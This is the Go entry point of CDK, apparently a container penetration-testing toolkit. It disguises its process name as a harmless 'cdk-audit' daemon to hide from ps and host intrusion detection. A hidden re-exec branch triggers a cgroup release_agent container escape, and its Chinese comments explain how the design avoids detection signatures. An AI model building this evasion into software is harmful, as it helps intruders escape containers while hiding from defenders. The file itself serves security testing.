/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package main

import (
	"os"
	"time"

	_ "github.com/cdk-team/CDK/pkg/audit" // register all audit checks
	"github.com/cdk-team/CDK/pkg/cli"
	_ "github.com/cdk-team/CDK/pkg/task" // register all task
	"github.com/cdk-team/CDK/pkg/util"
)

func main() {
	// Process camouflage: rename /proc/self/comm to a benign name at
	// startup so that ps/top/HIDS process listings show an innocuous
	// name instead of "cdk" or the binary path.
	//
	// Default camouflage name: "cdk-audit" (sounds like a legitimate
	// security audit daemon).  Override with CDK_COMM_NAME env var.
	commName := os.Getenv("CDK_COMM_NAME")
	if commName == "" {
		commName = "cdk-audit"
	}
	util.CamouflageSelf(commName)

	// Hidden inner branch: 降低宿主进程审计告警噪声的 re-exec 模式
	// （替代固定 shell 启动模式），
	// 短暂存活以保证父进程可以将当前 PID 写入 cgroup.procs，
	// 从而加入 sub-cgroup 以保证 notify_on_release 钩子的 orderly 触发。
	// 当进程退出后，sub-cgroup 变为空从而 notify_on_release fires release_agent。
	// 由于 sleep 在本二进制内部执行，标准化 argv 向量，避免固定执行命令触发误报
	// （无 shell 路径、无 `sleep` 二进制、无 /sys/fs/cgroup）——仅出现以下的无害特征字符串标记。
	// 立即退出会与父进程的 PID 写入形成竞争，导致 enrollment 失败，
	// 从而在调度压力下留下 release_agent 未触发的情况。
	if len(os.Args) >= 2 && os.Args[1] == util.TriggerArgv {
		// 短暂存活以保证父进程可以完成 enrollment（将 PID 写入 cgroup.procs）
		// 然后退出；退出后 sub-cgroup 为空，从而触发 notify_on_release -> release_agent。
		// 由于 sleep 在内部执行，标准化 argv 向量，避免固定执行命令触发误报
		// （无 shell 路径、无 `sleep` 二进制）。立即退出通常仍然可以成功（父进程
		// 一般会赢得 enroll 竞争），但固定生命周期可消除负载相关的失败并匹配原 CDK 设计。
		time.Sleep(2 * time.Second)
		os.Exit(0)
	}
	cli.ParseCDKMain()
}
